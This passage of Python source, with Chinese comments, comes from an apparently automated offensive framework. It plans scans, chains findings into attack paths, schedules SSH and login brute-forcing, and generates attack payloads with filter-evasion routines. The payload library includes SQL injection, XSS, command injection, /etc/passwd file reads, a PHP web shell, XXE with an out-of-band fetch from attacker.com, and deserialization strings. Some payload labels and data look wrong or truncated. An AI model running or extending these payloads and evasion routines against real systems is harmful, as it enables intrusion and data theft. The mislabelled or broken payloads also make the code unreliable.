        ports = initial_scan.get('ports', [])

        # 转换端口为字符串便于匹配
        port_strs = [str(p.get('port', p)) if isinstance(p, dict) else str(p) for p in ports]
        all_indicators = services + port_strs

        scores = {}
        for target_type, pattern in self.target_patterns.items():
            score = sum(1 for indicator in pattern['indicators']
                       if any(indicator in str(item).lower() for item in all_indicators))
            scores[target_type] = score

        return max(scores, key=scores.get) if scores else 'unknown'

    def get_optimal_params(self, tool: str, target_type: str = 'unknown',
                          time_constraint: str = 'quick', stealth_mode: bool = False) -> Dict:
        """获取最优参数"""
        tool_params = self.optimal_params.get(tool, {})

        # 优先级：隐蔽模式 > 目标类型 > 时间约束 > 默认
        if stealth_mode and 'stealth' in tool_params:
            return tool_params['stealth']

        # 根据目标类型选择参数
        if target_type == 'web_application' and 'web_target' in tool_params:
            return tool_params['web_target']
        elif target_type == 'web_application' and tool == 'gobuster' and 'api_focused' in tool_params:
            return tool_params['api_focused']

        # 根据时间约束选择
        constraint_key = time_constraint.lower()
        if constraint_key in tool_params:
            return tool_params[constraint_key]

        # 返回默认快速配置
        return tool_params.get('quick', {})

    def estimate_execution_time(self, tool: str, params: Dict, target_complexity: float = 1.0) -> int:
        """估算执行时间"""
        base_time = params.get('estimated_time', 60)
        return int(base_time * target_complexity)

    def get_recommended_sequence(self, target_type: str, time_budget: int = 300) -> List[ScanStep]:
        """获取推荐的扫描序列"""
        sequences = {
            'web_application': [
                ScanStep('nmap', self.get_optimal_params('nmap', 'web_application'), 10, 120),
                ScanStep('gobuster', self.get_optimal_params('gobuster', 'web_application'), 9, 90),
                ScanStep('nikto', self.get_optimal_params('nikto'), 8, 180),
                ScanStep('sqlmap', self.get_optimal_params('sqlmap', time_constraint='quick'), 7, 300)
            ],
            'ssh_server': [
                ScanStep('nmap', self.get_optimal_params('nmap'), 10, 60),
                ScanStep('hydra', self.get_optimal_params('hydra'), 8, 300)
            ],
            'unknown': [
                ScanStep('nmap', self.get_optimal_params('nmap'), 10, 60)
            ]
        }

        sequence = sequences.get(target_type, sequences['unknown'])

        # 根据时间预算调整
        total_time = sum(step.time_estimate for step in sequence)
        if total_time > time_budget:
            # 选择高优先级步骤
            sequence = [step for step in sequence if step.priority >= 8]

        return sequence

class ResultCorrelationEngine:
    """结果关联分析引擎 - 分析多工具结果的关联性"""

    def __init__(self):
        self.correlation_rules = self._load_correlation_rules()
        self.attack_patterns = self._load_attack_patterns()
        self.vulnerability_chains = self._load_vulnerability_chains()

    def _load_correlation_rules(self) -> Dict:
        """加载关联规则"""
        return {
            'web_admin_access': {
                'conditions': [
                    {'tool': 'gobuster', 'pattern': r'/admin|/login|/dashboard', 'weight': 0.8},
                    {'tool': 'nmap', 'pattern': r'http.*open', 'weight': 0.6},
                    {'tool': 'nikto', 'pattern': r'admin.*found', 'weight': 0.9}
                ],
                'confidence_threshold': 0.7,
                'attack_chain': ['directory_access', 'credential_attack', 'privilege_escalation']
            },
            'sql_injection_chain': {
                'conditions': [
                    {'tool': 'gobuster', 'pattern': r'\.php|\.asp|\.jsp', 'weight': 0.6},
                    {'tool': 'nikto', 'pattern': r'sql|database', 'weight': 0.7},
                    {'tool': 'sqlmap', 'pattern': r'vulnerable|injection', 'weight': 1.0}
                ],
                'confidence_threshold': 0.8,
                'attack_chain': ['parameter_discovery', 'sql_injection', 'database_extraction']
            },
            'credential_reuse_opportunity': {
                'conditions': [
                    {'tool': 'hydra', 'pattern': r'login.*valid', 'weight': 1.0},
                    {'tool': 'nmap', 'pattern': r'ssh.*open|ftp.*open', 'weight': 0.5}
                ],
                'confidence_threshold': 0.6,
                'attack_chain': ['credential_validation', 'service_access', 'lateral_movement']
            },
            'file_upload_rce': {
                'conditions': [
                    {'tool': 'gobuster', 'pattern': r'/upload|/file', 'weight': 0.8},
                    {'tool': 'nikto', 'pattern': r'upload.*vulnerable', 'weight': 0.9}
                ],
                'confidence_threshold': 0.7,
                'attack_chain': ['file_upload', 'code_execution', 'system_compromise']
            }
        }

    def _load_attack_patterns(self) -> Dict:
        """加载攻击模式"""
        return {
            'web_application_takeover': {
                'phases': [
                    {'name': 'reconnaissance', 'tools': ['nmap', 'gobuster'], 'success_rate': 0.9},
                    {'name': 'vulnerability_discovery', 'tools': ['nikto', 'sqlmap'], 'success_rate': 0.7},
                    {'name': 'exploitation', 'tools': ['sqlmap', 'custom'], 'success_rate': 0.6}
                ],
                'overall_success_rate': 0.4
            },
            'ssh_brute_force': {
                'phases': [
                    {'name': 'service_discovery', 'tools': ['nmap'], 'success_rate': 0.95},
                    {'name': 'credential_attack', 'tools': ['hydra'], 'success_rate': 0.3}
                ],
                'overall_success_rate': 0.28
            }
        }

    def _load_vulnerability_chains(self) -> Dict:
        """加载漏洞链模式"""
        return {
            'directory_traversal_to_rce': [
                'directory_listing', 'path_traversal', 'file_inclusion', 'code_execution'
            ],
            'sql_to_shell': [
                'sql_injection', 'file_write', 'web_shell', 'command_execution'
            ],
            'weak_auth_to_admin': [
                'credential_discovery', 'authentication_bypass', 'privilege_escalation'
            ]
        }

    def correlate_results(self, tool_results: Dict[str, Dict]) -> List[CorrelatedFinding]:
        """关联多个工具的扫描结果"""
        findings = []

        for rule_name, rule_config in self.correlation_rules.items():
            confidence = self._calculate_rule_confidence(rule_config, tool_results)

            if confidence >= rule_config['confidence_threshold']:
                evidence = self._extract_evidence(rule_config, tool_results)

                finding = CorrelatedFinding(
                    name=rule_name,
                    confidence=confidence,
                    evidence=evidence,
                    attack_chain=rule_config['attack_chain'],
                    risk_score=self._calculate_risk_score(confidence, rule_config)
                )
                findings.append(finding)

        return sorted(findings, key=lambda x: x.risk_score, reverse=True)

    def _calculate_rule_confidence(self, rule_config: Dict, tool_results: Dict) -> float:
        """计算规则匹配置信度"""
        total_weight = 0
        matched_weight = 0

        for condition in rule_config['conditions']:
            tool = condition['tool']
            pattern = condition['pattern']
            weight = condition['weight']

            total_weight += weight

            if tool in tool_results:
                tool_output = str(tool_results[tool].get('output', ''))
                if re.search(pattern, tool_output, re.IGNORECASE):
                    matched_weight += weight

        return matched_weight / total_weight if total_weight > 0 else 0

    def _extract_evidence(self, rule_config: Dict, tool_results: Dict) -> List[str]:
        """提取证据"""
        evidence = []

        for condition in rule_config['conditions']:
            tool = condition['tool']
            pattern = condition['pattern']

            if tool in tool_results:
                tool_output = str(tool_results[tool].get('output', ''))
                matches = re.findall(pattern, tool_output, re.IGNORECASE)
                if matches:
                    evidence.extend([f"{tool}: {match}" for match in matches[:3]])  # 限制每个工具3个证据

        return evidence

    def _calculate_risk_score(self, confidence: float, rule_config: Dict) -> int:
        """计算风险评分 (1-10)"""
        base_score = confidence * 10

        # 根据攻击链长度调整风险
        attack_chain_length = len(rule_config.get('attack_chain', []))
        chain_multiplier = min(1.5, 1 + attack_chain_length * 0.1)

        return min(10, int(base_score * chain_multiplier))

    def identify_attack_paths(self, correlated_findings: List[CorrelatedFinding]) -> List[Dict]:
        """识别可能的攻击路径"""
        attack_paths = []

        for finding in correlated_findings:
            if finding.confidence > 0.8:  # 高置信度发现
                path = {
                    'name': finding.name,
                    'steps': finding.attack_chain,
                    'success_probability': finding.confidence,
                    'risk_level': finding.risk_score,
                    'recommended_tools': self._get_recommended_tools(finding.attack_chain)
                }
                attack_paths.append(path)

        return attack_paths

    def _get_recommended_tools(self, attack_chain: List[str]) -> Dict[str, str]:
        """为攻击链推荐工具"""
        tool_mapping = {
            'directory_access': 'gobuster',
            'credential_attack': 'hydra',
            'sql_injection': 'sqlmap',
            'file_upload': 'curl',
            'code_execution': 'metasploit',
            'privilege_escalation': 'linpeas'
        }

        return {step: tool_mapping.get(step, 'manual') for step in attack_chain}

class AdaptiveScanStrategy:
    """自适应扫描策略 - 基于初步结果动态调整扫描策略"""

    def __init__(self):
        self.scan_templates = self._load_scan_templates()
        self.adaptation_rules = self._load_adaptation_rules()
        self.time_budgets = self._load_time_budgets()

    def _load_scan_templates(self) -> Dict:
        """加载扫描模板"""
        return {
            'initial_discovery': {
                'phase': 'discovery',
                'tools': [
                    {'name': 'nmap', 'params': {'sS': True, 'top-ports': '1000'}, 'priority': 10},
                    {'name': 'ping_sweep', 'params': {'count': 3}, 'priority': 9}
                ],
                'max_time': 60,
                'success_criteria': ['open_ports_found', 'host_responsive']
            },
            'web_application_scan': {
                'phase': 'enumeration',
                'tools': [
                    {'name': 'gobuster', 'params': {'threads': 50}, 'priority': 10},
                    {'name': 'nikto', 'params': {'tuning': 'x6'}, 'priority': 9},
                    {'name': 'whatweb', 'params': {'aggression': 3}, 'priority': 8}
                ],
                'max_time': 300,
                'success_criteria': ['directories_found', 'vulnerabilities_found']
            },
            'vulnerability_validation': {
                'phase': 'exploitation',
                'tools': [
                    {'name': 'sqlmap', 'params': {'level': 3}, 'priority': 10},
                    {'name': 'hydra', 'params': {'threads': 4}, 'priority': 8}
                ],
                'max_time': 600,
                'success_criteria': ['vulnerability_confirmed', 'access_gained']
            }
        }

    def _load_adaptation_rules(self) -> Dict:
        """加载适应规则"""
        return {
            'web_service_detected': {
                'trigger': {'nmap_output': r'http.*open'},
                'add_scans': ['web_application_scan'],
                'modify_params': {
                    'gobuster': {'extensions': 'php,html,js'},
                    'nikto': {'port': '80,443,8080'}
                }
            },
            'ssh_service_detected': {
                'trigger': {'nmap_output': r'ssh.*open'},
                'add_scans': ['ssh_enumeration'],
                'modify_params': {
                    'hydra': {'service': 'ssh', 'userlist': 'common_users.txt'}
                }
            },
            'admin_panel_found': {
                'trigger': {'gobuster_output': r'/admin|/login'},
                'add_scans': ['credential_attack'],
                'increase_priority': ['hydra', 'medusa']
            },
            'waf_detected': {
                'trigger': {'nikto_output': r'firewall|blocked'},
                'modify_params': {
                    'sqlmap': {'delay': 2, 'tamper': 'space2comment'},
                    'gobuster': {'delay': 1000}
                },
                'reduce_threads': True
            }
        }

    def _load_time_budgets(self) -> Dict:
        """加载时间预算配置"""
        return {
            'quick': {'total': 300, 'per_phase': 100},      # 5分钟快速扫描
            'standard': {'total': 900, 'per_phase': 300},   # 15分钟标准扫描
            'thorough': {'total': 1800, 'per_phase': 600},  # 30分钟深度扫描
            'comprehensive': {'total': 3600, 'per_phase': 1200}  # 1小时全面扫描
        }

    def generate_adaptive_scan_plan(self, target: str, initial_results: Dict = None,
                                  time_budget: str = 'standard') -> List[ScanStep]:
        """生成自适应扫描计划"""
        scan_plan = []
        budget_config = self.time_budgets.get(time_budget, self.time_budgets['standard'])

        # 第一阶段：初始发现（如果没有提供初始结果）
        if not initial_results:
            discovery_template = self.scan_templates['initial_discovery']
            scan_plan.extend(self._template_to_scan_steps(discovery_template, target))

        # 基于初始结果或提供的结果进行适应性调整
        results_to_analyze = initial_results or {}

        # 应用适应性规则
        additional_scans = []
        param_modifications = {}

        for rule_name, rule_config in self.adaptation_rules.items():
            if self._check_trigger(rule_config['trigger'], results_to_analyze):
                # 添加额外扫描
                if 'add_scans' in rule_config:
                    for scan_type in rule_config['add_scans']:
                        if scan_type in self.scan_templates:
                            additional_scans.extend(
                                self._template_to_scan_steps(self.scan_templates[scan_type], target)
                            )

                # 修改参数
                if 'modify_params' in rule_config:
                    param_modifications.update(rule_config['modify_params'])

        # 应用参数修改
        for step in scan_plan + additional_scans:
            if step.tool in param_modifications:
                step.parameters.update(param_modifications[step.tool])

        scan_plan.extend(additional_scans)

        # 根据时间预算调整扫描计划
        scan_plan = self._optimize_for_time_budget(scan_plan, budget_config)

        return sorted(scan_plan, key=lambda x: x.priority, reverse=True)

    def _template_to_scan_steps(self, template: Dict, target: str) -> List[ScanStep]:
        """将模板转换为扫描步骤"""
        steps = []

        for tool_config in template['tools']:
            # 为参数添加目标
            params = tool_config['params'].copy()
            if tool_config['name'] == 'nmap':
                params['target'] = target
            elif tool_config['name'] in ['gobuster', 'nikto']:
                params['url'] = f"http://{target}"

            step = ScanStep(
                tool=tool_config['name'],
                parameters=params,
                priority=tool_config['priority'],
                time_estimate=template.get('max_time', 60) // len(template['tools'])
            )
            steps.append(step)

        return steps

    def _check_trigger(self, trigger: Dict, results: Dict) -> bool:
        """检查触发条件"""
        for result_key, pattern in trigger.items():
            tool_name = result_key.replace('_output', '')
            if tool_name in results:
                output = str(results[tool_name].get('output', ''))
                if re.search(pattern, output, re.IGNORECASE):
                    return True
        return False

    def _optimize_for_time_budget(self, scan_plan: List[ScanStep], budget_config: Dict) -> List[ScanStep]:
        """根据时间预算优化扫描计划"""
        total_budget = budget_config['total']

        # 计算总预估时间
        total_estimated_time = sum(step.time_estimate for step in scan_plan)

        if total_estimated_time <= total_budget:
            return scan_plan  # 时间充足，不需要调整

        # 时间不足，需要优化
        # 1. 首先按优先级排序
        sorted_steps = sorted(scan_plan, key=lambda x: x.priority, reverse=True)

        # 2. 选择高优先级步骤，直到达到时间预算
        optimized_plan = []
        current_time = 0

        for step in sorted_steps:
            if current_time + step.time_estimate <= total_budget:
                optimized_plan.append(step)
                current_time += step.time_estimate
            elif step.priority >= 9:  # 关键步骤，尝试缩减时间
                # 调整参数以减少时间
                if step.tool == 'gobuster':
                    step.parameters['threads'] = min(100, step.parameters.get('threads', 50) * 2)
                    step.time_estimate = step.time_estimate // 2
                elif step.tool == 'nmap':
                    step.parameters['T4'] = True  # 加快扫描速度
                    step.time_estimate = int(step.time_estimate * 0.7)

                if current_time + step.time_estimate <= total_budget:
                    optimized_plan.append(step)
                    current_time += step.time_estimate

        return optimized_plan

    def adapt_based_on_results(self, current_plan: List[ScanStep],
                             execution_results: Dict) -> List[ScanStep]:
        """基于执行结果调整扫描计划"""
        adapted_plan = current_plan.copy()

        # 分析结果并调整后续扫描
        for rule_name, rule_config in self.adaptation_rules.items():
            if self._check_trigger(rule_config['trigger'], execution_results):
                # 动态添加新的扫描步骤
                if 'add_scans' in rule_config:
                    for scan_type in rule_config['add_scans']:
                        if scan_type in self.scan_templates:
                            new_steps = self._template_to_scan_steps(
                                self.scan_templates[scan_type],
                                execution_results.get('target', 'unknown')
                            )
                            adapted_plan.extend(new_steps)

        return adapted_plan

    def get_next_recommended_action(self, completed_scans: List[str],
                                  results_summary: Dict) -> Optional[ScanStep]:
        """获取下一步推荐行动"""
        # 基于已完成的扫描和结果，推荐下一步
        if 'nmap' in completed_scans and 'http' in str(results_summary):
            if 'gobuster' not in completed_scans:
                return ScanStep(
                    tool='gobuster',
                    parameters={'threads': 50, 'wordlist': 'common.txt'},
                    priority=9
                )

        if 'gobuster' in completed_scans and '/admin' in str(results_summary):
            if 'hydra' not in completed_scans:
                return ScanStep(
                    tool='hydra',
                    parameters={'service': 'http-form-post', 'userlist': 'admin_users.txt'},
                    priority=8
                )

        return None

# ==================== 智能工具优化和结果关联机制 ====================

def apply_intelligent_optimization(tool_name: str, params: dict) -> dict:
    """
    为任何工具应用智能参数优化

    Args:
        tool_name: 工具名称
        params: 原始参数字典

    Returns:
        优化后的参数字典
    """
    if 'parameter_optimizer' not in globals():
        return params

    try:
        # 获取智能优化参数
        use_intelligent_params = params.get("intelligent_optimization", True)
        if not use_intelligent_params:
            return params

        target_type = params.get("target_type", "unknown")
        time_constraint = params.get("time_constraint", "quick")
        stealth_mode = params.get("stealth_mode", False)

        # 分析目标类型
        target = params.get("target") or params.get("url") or params.get("host", "")
        if target and target_type == "unknown":
            target_type = parameter_optimizer._analyze_target_type(target, {})

        # 获取优化参数
        optimal_params = parameter_optimizer.get_optimal_params(
            tool=tool_name,
            target_type=target_type,
            time_constraint=time_constraint,
            stealth_mode=stealth_mode
        )

        # 合并优化参数
        optimized_params = params.copy()
        for key, value in optimal_params.items():
            if key == "additional_args":
                if optimized_params.get("additional_args"):
                    optimized_params["additional_args"] += f" {value}"
                else:
                    optimized_params["additional_args"] = value
            elif key not in optimized_params or not optimized_params[key]:
                optimized_params[key] = value

        logger.info(f"Applied intelligent optimization for {tool_name}: {optimal_params}")
        return optimized_params

    except Exception as e:
        logger.warning(f"Failed to apply intelligent optimization for {tool_name}: {e}")
        return params

def store_scan_result(tool_name: str, target: str, result: dict):
    """
    存储扫描结果用于自动关联分析

    Args:
        tool_name: 工具名称
        target: 目标
        result: 扫描结果
    """
    if 'scan_results_cache' not in globals():
        globals()['scan_results_cache'] = {}

    if target not in scan_results_cache:
        scan_results_cache[target] = {}

    scan_results_cache[target][tool_name] = {
        "timestamp": time.time(),
        "result": result
    }

    # 如果有多个工具的结果，触发自动关联分析
    if len(scan_results_cache[target]) >= 2:
        try_auto_correlation(target)

def try_auto_correlation(target: str):
    """
    尝试自动关联分析

    Args:
        target: 目标
    """
    if 'correlation_engine' not in globals() or target not in scan_results_cache:
        return

    try:
        # 准备关联分析数据
        tool_results = {}
        for tool_name, data in scan_results_cache[target].items():
            tool_results[tool_name] = data["result"]

        # 执行关联分析
        correlations = correlation_engine.correlate_results(tool_results)

        if correlations:
            # 存储关联分析结果
            scan_results_cache[target]["_correlations"] = {
                "timestamp": time.time(),
                "findings": correlations
            }
            logger.info(f"Auto-correlation found {len(correlations)} findings for target {target}")

    except Exception as e:
        logger.warning(f"Auto-correlation failed for target {target}: {e}")

def add_intelligent_analysis_to_result(tool_name: str, target: str, result: dict, params: dict) -> dict:
    """
    为结果添加智能分析信息

    Args:
        tool_name: 工具名称
        target: 目标
        result: 原始结果
        params: 使用的参数

    Returns:
        增强后的结果
    """
    if not params.get("intelligent_optimization", True):
        return result

    if result.get("success") and 'parameter_optimizer' in globals():
        try:
            target_type = params.get("target_type", "unknown")
            service_type = tool_name_to_service_type(tool_name)

            result["intelligent_analysis"] = {
                "target_type": target_type,
                "optimization_applied": True,
                "recommended_follow_up": parameter_optimizer._get_attack_vectors_for_service(service_type),
                "tool_category": service_type
            }

            # 存储结果用于关联分析
            store_scan_result(tool_name, target, result)

            # 如果有关联分析结果，添加到返回数据中
            if target in scan_results_cache and "_correlations" in scan_results_cache[target]:
                result["auto_correlations"] = scan_results_cache[target]["_correlations"]["findings"]

        except Exception as e:
            logger.warning(f"Failed to add intelligent analysis for {tool_name}: {e}")

    return result

def tool_name_to_service_type(tool_name: str) -> str:
    """将工具名称映射到服务类型"""
    mapping = {
        "nmap": "network",
        "gobuster": "web",
        "sqlmap": "database",
        "hydra": "auth",
        "nuclei": "web",
        "nikto": "web",
        "masscan": "network",
        "ffuf": "web",
        "feroxbuster": "web",
        "wpscan": "web",
        "dirb": "web",
        "wfuzz": "web",
        "sublist3r": "dns",
        "theharvester": "osint",
        "dnsrecon": "dns",
        "enum4linux": "smb",
        "john": "crypto",
        "hashcat": "crypto"
    }
    return mapping.get(tool_name, "unknown")

# ==================== 智能Payload生成器 ====================

@dataclass
class PayloadTemplate:
    """Payload模板数据类"""
    name: str
    vulnerability_type: str
    base_payload: str
    target_platforms: List[str]
    encoding_methods: List[str]
    success_indicators: List[str]
    evasion_techniques: List[str]

@dataclass
class PayloadResult:
    """Payload生成结果"""
    original_payload: str
    generated_payloads: List[str]
    encoding_used: List[str]
    evasion_techniques: List[str]
    target_compatibility: Dict[str, float]
    estimated_success_rate: float

class IntelligentPayloadGenerator:
    """智能Payload生成器 - AI驱动的Payload自动生成和变异"""

    def __init__(self):
        self.payload_templates = self._initialize_payload_templates()
        self.encoding_engines = self._initialize_encoding_engines()
        self.evasion_techniques = self._initialize_evasion_techniques()
        self.success_history = {}  # 存储历史成功率数据

    def _initialize_payload_templates(self) -> Dict[str, List[PayloadTemplate]]:
        """初始化Payload模板库"""
        templates = {
            "sql_injection": [
                PayloadTemplate(
                    name="mysql_union_based",
                    vulnerability_type="sql_injection",
                    base_payload="' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- ",
                    target_platforms=["mysql", "mariadb"],
                    encoding_methods=["url", "hex", "base64"],
                    success_indicators=["mysql_version", "database_name", "table_names"],
                    evasion_techniques=["comment_obfuscation", "case_variation", "whitespace_manipulation"]
                ),
                PayloadTemplate(
                    name="postgresql_error_based",
                    vulnerability_type="sql_injection",
                    base_payload="' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
                    target_platforms=["postgresql"],
                    encoding_methods=["url", "unicode"],
                    success_indicators=["postgresql_version", "error_message"],
                    evasion_techniques=["function_obfuscation", "nested_queries"]
                ),
                PayloadTemplate(
                    name="mssql_time_based",
                    vulnerability_type="sql_injection",
                    base_payload="'; WAITFOR DELAY '00:00:05'-- ",
                    target_platforms=["mssql"],
                    encoding_methods=["url", "double_url"],
                    success_indicators=["time_delay", "response_delay"],
                    evasion_techniques=["time_randomization", "conditional_delays"]
                )
            ],
            "xss": [
                PayloadTemplate(
                    name="dom_xss_basic",
                    vulnerability_type="xss",
                    base_payload="<script>alert('XSS')</script>",
                    target_platforms=["chrome", "firefox", "safari", "ie"],
                    encoding_methods=["html", "url", "unicode"],
                    success_indicators=["alert_executed", "dom_modified"],
                    evasion_techniques=["event_handler", "javascript_obfuscation", "tag_variation"]
                ),
                PayloadTemplate(
                    name="svg_xss",
                    vulnerability_type="xss",
                    base_payload="<svg onload=alert('XSS')>",
                    target_platforms=["chrome", "firefox", "safari"],
                    encoding_methods=["html", "xml"],
                    success_indicators=["svg_rendered", "script_executed"],
                    evasion_techniques=["svg_attributes", "xml_entities"]
                ),
                PayloadTemplate(
                    name="polyglot_xss",
                    vulnerability_type="xss",
                    base_payload="javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                    target_platforms=["all"],
                    encoding_methods=["mixed", "context_aware"],
                    success_indicators=["multi_context_break", "script_executed"],
                    evasion_techniques=["context_breaking", "polyglot_structure"]
                )
            ],
            "command_injection": [
                PayloadTemplate(
                    name="unix_command_basic",
                    vulnerability_type="command_injection",
                    base_payload="; id; #",
                    target_platforms=["linux", "unix", "macos"],
                    encoding_methods=["url", "base64"],
                    success_indicators=["uid_output", "command_executed"],
                    evasion_techniques=["command_substitution", "variable_expansion", "path_manipulation"]
                ),
                PayloadTemplate(
                    name="windows_command_basic",
                    vulnerability_type="command_injection",
                    base_payload="& whoami & ",
                    target_platforms=["windows"],
                    encoding_methods=["url", "powershell_base64"],
                    success_indicators=["username_output", "command_executed"],
                    evasion_techniques=["cmd_obfuscation", "powershell_encoding"]
                ),
                PayloadTemplate(
                    name="blind_command_time",
                    vulnerability_type="command_injection",
                    base_payload="; sleep 5; #",
                    target_platforms=["linux", "unix"],
                    encoding_methods=["url"],
                    success_indicators=["time_delay"],
                    evasion_techniques=["time_randomization", "alternative_delay_commands"]
                )
            ],
            "lfi": [
                PayloadTemplate(
                    name="linux_passwd",
                    vulnerability_type="lfi",
                    base_payload="../../../etc/passwd",
                    target_platforms=["linux", "unix"],
                    encoding_methods=["url", "double_url", "unicode"],
                    success_indicators=["passwd_content", "root_entry"],
                    evasion_techniques=["path_traversal_variation", "null_byte_injection", "encoding_bypass"]
                ),
                PayloadTemplate(
                    name="windows_boot_ini",
                    vulnerability_type="lfi",
                    base_payload="..\\..\\..\\boot.ini",
                    target_platforms=["windows"],
                    encoding_methods=["url", "double_url"],
                    success_indicators=["boot_ini_content", "windows_version"],
                    evasion_techniques=["backslash_variation", "drive_letter_manipulation"]
                ),
                PayloadTemplate(
                    name="php_wrapper_filter",
                    vulnerability_type="lfi",
                    base_payload="php://filter/convert.base64-encode/resource=index.php",
                    target_platforms=["php"],
                    encoding_methods=["url"],
                    success_indicators=["base64_encoded_php", "source_code"],
                    evasion_techniques=["php_wrapper_chaining", "filter_bypass"]
                )
            ],
            "rce": [
                PayloadTemplate(
                    name="php_system",
                    vulnerability_type="rce",
                    base_payload="<?php system($_GET['cmd']); ?>",
                    target_platforms=["php"],
                    encoding_methods=["url", "base64"],
                    success_indicators=["command_output", "shell_access"],
                    evasion_techniques=["function_obfuscation", "variable_variables", "eval_alternatives"]
                ),
                PayloadTemplate(
                    name="python_exec",
                    vulnerability_type="rce",
                    base_payload="__import__('os').system('id')",
                    target_platforms=["python"],
                    encoding_methods=["url", "unicode"],
                    success_indicators=["python_output", "import_success"],
                    evasion_techniques=["import_obfuscation", "exec_alternatives", "bytecode_manipulation"]
                ),
                PayloadTemplate(
                    name="java_runtime",
                    vulnerability_type="rce",
                    base_payload="Runtime.getRuntime().exec(\"whoami\")",
                    target_platforms=["java"],
                    encoding_methods=["url", "unicode"],
                    success_indicators=["java_output", "runtime_access"],
                    evasion_techniques=["reflection_bypass", "classloader_manipulation"]
                )
            ],
            "xxe": [
                PayloadTemplate(
                    name="external_entity_file",
                    vulnerability_type="xxe",
                    base_payload="""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>""",
                    target_platforms=["xml_parser"],
                    encoding_methods=["url", "xml_entities"],
                    success_indicators=["file_content", "passwd_data"],
                    evasion_techniques=["entity_expansion", "parameter_entities", "encoding_bypass"]
                ),
                PayloadTemplate(
                    name="blind_xxe_oob",
                    vulnerability_type="xxe",
                    base_payload="""<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/malicious.dtd"> %ext;]><root></root>""",
                    target_platforms=["xml_parser"],
                    encoding_methods=["url"],
                    success_indicators=["http_request", "dns_lookup"],
                    evasion_techniques=["out_of_band_exfiltration", "dtd_chaining"]
                )
            ],
            "deserialization": [
                PayloadTemplate(
                    name="java_commons_collections",
                    vulnerability_type="deserialization",
                    base_payload="rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubGFuZy5DbGFzcw==",
                    target_platforms=["java"],
                    encoding_methods=["base64", "hex"],
                    success_indicators=["code_execution", "class_loaded"],
                    evasion_techniques=["gadget_chaining", "transformer_bypass"]
                ),
                PayloadTemplate(
                    name="python_pickle",
                    vulnerability_type="deserialization",
                    base_payload="c__builtin__\neval\np0\n(Vprint('RCE via pickle')\np1\ntp2\nRp3\n.",
                    target_platforms=["python"],
                    encoding_methods=["base64", "url"],
                    success_indicators=["python_output", "eval_executed"],
                    evasion_techniques=["pickle_protocol_manipulation", "import_bypass"]
                )
            ]
        }
        return templates

    def _initialize_encoding_engines(self) -> Dict[str, callable]:
        """初始化编码引擎"""
        import urllib.parse
        import base64
        import html
        import binascii

        return {
            "url": lambda x: urllib.parse.quote(x),
            "double_url": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            "html": lambda x: html.escape(x),
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "hex": lambda x: binascii.hexlify(x.encode()).decode(),
            "unicode": lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            "xml_entities": lambda x: x.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;'),
            "powershell_base64": lambda x: base64.b64encode(x.encode('utf-16le')).decode()
        }

    def _initialize_evasion_techniques(self) -> Dict[str, callable]:
        """初始化规避技术"""
        import random
        import string

        def comment_obfuscation(payload):
            """SQL注释混淆"""
            comments = ["/**/", "-- ", "#", ";--"]
            return random.choice(comments).join(payload.split(' '))

        def case_variation(payload):
            """大小写变化"""
            return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)

        def whitespace_manipulation(payload):
            """空白字符操作"""
            whitespaces = [' ', '\t', '\n', '\r', '/**/', '+']
            return random.choice(whitespaces).join(payload.split(' '))

        def javascript_obfuscation(payload):
            """JavaScript混淆"""
            if 'alert' in payload:
                obfuscated = payload.replace('alert', 'window["ale"+"rt"]')
                return obfuscated
            return payload

        def path_traversal_variation(payload):
            """路径遍历变化"""
            variations = ['../', '.\\', '..\\', '....//']
            for var in variations:
                if '../' in payload:
                    payload = payload.replace('../', random.choice(variations))
            return payload

        return {
            "comment_obfuscation": comment_obfuscation,
            "case_variation": case_variation,
            "whitespace_manipulation": whitespace_manipulation,
            "javascript_obfuscation": javascript_obfuscation,
            "path_traversal_variation": path_traversal_variation,
            "time_randomization": lambda x: x.replace('5', str(random.randint(3, 8))),
            "tag_variation": lambda x: x.replace('<script>', random.choice(['<SCRIPT>', '<ScRiPt>', '<script type="text/javascript">'])),
            "function_obfuscation": lambda x: x.replace('system', random.choice(['exec', 'shell_exec', 'passthru'])),
            "encoding_bypass": lambda x: urllib.parse.quote(x, safe='')
        }

    def generate_intelligent_payload(self, vulnerability_type: str, target_info: Dict[str, Any],
                                   evasion_level: str = "medium", quantity: int = 5) -> PayloadResult:
        """
        智能生成针对特定漏洞的Payload

        Args:
            vulnerability_type: 漏洞类型
            target_info: 目标信息 (操作系统、应用类型、WAF等)
            evasion_level: 规避级别 (low, medium, high)
            quantity: 生成数量

        Returns:
            PayloadResult: 生成的Payload结果
        """
        if vulnerability_type not in self.payload_templates:
            return PayloadResult(
                original_payload="",
                generated_payloads=[],
                encoding_used=[],
                evasion_techniques=[],
                target_compatibility={},
                estimated_success_rate=0.0
            )

        # 根据目标信息选择最适合的模板
        suitable_templates = self._select_suitable_templates(vulnerability_type, target_info)

        if not suitable_templates:
            suitable_templates = self.payload_templates[vulnerability_type][:1]

        # 生成变化的Payload
        generated_payloads = []
        encoding_used = []
        evasion_techniques_used = []

        for template in suitable_templates[:quantity]:
            # 基础Payload
            base_payload = template.base_payload

            # 应用规避技术
            evasion_count = {"low": 1, "medium": 2, "high": 3}.get(evasion_level, 2)
            applied_evasions = random.sample(template.evasion_techniques,
                                           min(evasion_count, len(template.evasion_techniques)))

            modified_payload = base_payload
            for evasion in applied_evasions:
                if evasion in self.evasion_techniques:
                    modified_payload = self.evasion_techniques[evasion](modified_payload)

            # 应用编码
            encoding_methods = self._select_encoding_methods(target_info, template.encoding_methods)
            for encoding in encoding_methods:
                if encoding in self.encoding_engines:
                    encoded_payload = self.encoding_engines[encoding](modified_payload)
